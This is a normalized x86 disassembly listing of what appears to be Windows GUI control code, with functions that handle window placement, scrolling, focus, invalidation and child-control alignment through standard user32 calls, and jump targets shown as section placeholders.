call sub_4576d8
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_441a58
test eax eax
jne r-xdata
jmp r-xdata
sub_446948
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_441a58
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_44699c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_441a58
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4576d8
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_441a58
test eax eax
jne r-xdata
sub_4469e8
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_4467d0
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_441a58
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4576d8
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_441a58
test eax eax
jne r-xdata
sub_446a44
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4576d8
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_441a58
mov [ esi + 0xc ] eax
sub_446a78
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_4473c8
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4473c8
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_43fef8
mov eax ebx
mov si 0xffd0
call sub_403418
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_440244
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_446b50
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_443dbc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_443d80
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403418
inc edi
dec ebx
jne r-xdata
sub_446b98
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_443924
xor eax eax
push ebp
push sub_446c36
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_446b50
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4404c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446c3d
mov eax [ ebp - 0x4 ]
call sub_44392c
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_446c44
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_443dbc
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_44394c
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_443d80
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_446d34
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_41a1f8
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_41a08c
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_41a218
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_41a19c
call sub_4470c4
jmp r-xdata
mov eax ebp
mov edx esi
call sub_41a19c
call sub_4470c4
sub_446e0c
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_446d34
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_446e6c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_4470c4
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_4470c4
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
test eax eax
jne r-xdata
sub_446f08
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4473c8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_441a58
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_432154
call sub_432234
test al al
je r-xdata
mov eax ebx
call sub_443dbc
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_443d80
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_443d80
test [ eax + 0x52 ] 0x4
je r-xdata
sub_446fcc
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_440244
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_447004
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_4576d8
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_447044
push ebx
mov ebx eax
mov eax ebx
call sub_4576d8
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_45b444
pop ebx
retn
mov eax ebx
call sub_457700
mov eax ebx
call sub_4470c4
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_44707c
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4470a0
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_4470a0
sub_4470d8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_418d68
mov eax edi
call sub_443dbc
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_443d80
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_44716c
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_4470c4
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_4471a4
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4473c8
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4470c4
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403418
sub_447260
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_41a1f8
pop esi
pop ebx
retn
sub_447284
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_447260
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_41a08c
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_41a218
sub_4472f8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_4473c8
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_441a58
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_447358
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4473bc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4473c3
lea eax [ ebp - 0x4 ]
call sub_40599c
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403418
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_4059b4
sub_4473d4
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43fef8
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_44748c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_41a19c
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_41a040
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403418
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_4474ec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4475e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403418
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4475e9
mov eax [ ebp - 0x14 ]
call sub_40321c
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_41a1f8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_41a19c
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403418
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_4475f8
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_4474ec
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_447624
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4576d8
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_4474ec
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_4474ec
mov edx eax
mov eax esi
call sub_45b344
sub_447668
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_443dbc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_443d80
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_4476b0
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_446d34
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_440b14
sub_4476f8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_44777c
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_4473c8
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_443dbc
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_447b3e
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_443dbc
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_4476f8
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_443d80
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
